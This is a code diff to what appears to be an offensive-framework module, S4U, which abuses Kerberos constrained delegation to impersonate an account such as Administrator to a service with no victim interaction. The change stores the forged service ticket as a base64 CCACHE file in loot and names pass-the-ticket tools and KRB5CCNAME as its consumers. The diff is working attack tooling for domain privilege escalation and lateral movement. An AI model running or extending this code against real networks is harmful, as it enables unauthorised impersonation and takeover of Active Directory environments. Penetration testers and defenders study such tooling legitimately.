@@ -46,6 +46,7 @@ try:
     from pyasn1.codec.der import decoder, encoder
     from pyasn1.type.univ import noValue
     from impacket.krb5 import constants
+    from impacket.krb5.ccache import CCache
     from impacket.krb5.asn1 import (
         AP_REQ,
         AS_REP,
@@ -227,7 +228,9 @@ class S4U(AuxiliaryModule):
         constrained delegation (find them with auxiliary/enum/delegation).
         Impersonates IMPERSONATE (default Administrator) to SPN — one of
         the account's msDS-AllowedToDelegateTo entries — with no victim
-        interaction. The final ticket lands in loot as base64. Auth by
+        interaction. The final ticket lands in loot as base64 CCACHE
+        (feed it to auxiliary/attack/pass_the_ticket or KRB5CCNAME
+        tools). Auth by
         NTHASH or PASSWORD (hashed to NT, which also forces an RC4 session
         key the checksum profile needs).
     """
@@ -320,6 +323,11 @@ class S4U(AuxiliaryModule):
                         f"impersonation complete")
         if store is not None:
             import base64
+            # ccache (ticket + session keys), the format pass_the_ticket
+            # and KRB5CCNAME tools consume
+            ccache = CCache()
+            ccache.fromTGS(rep2, session_key, session_key)
             store.add_loot("ticket", f"s4u {cname2} -> {sname2} @ {domain}",
-                           base64.b64encode(rep2).decode(), address=host)
-            self.print_status("Ticket saved as loot (base64 TGS-REP)")
+                           base64.b64encode(ccache.getData()).decode(),
+                           address=host)
+            self.print_status("Ticket saved as loot (base64 ccache)")
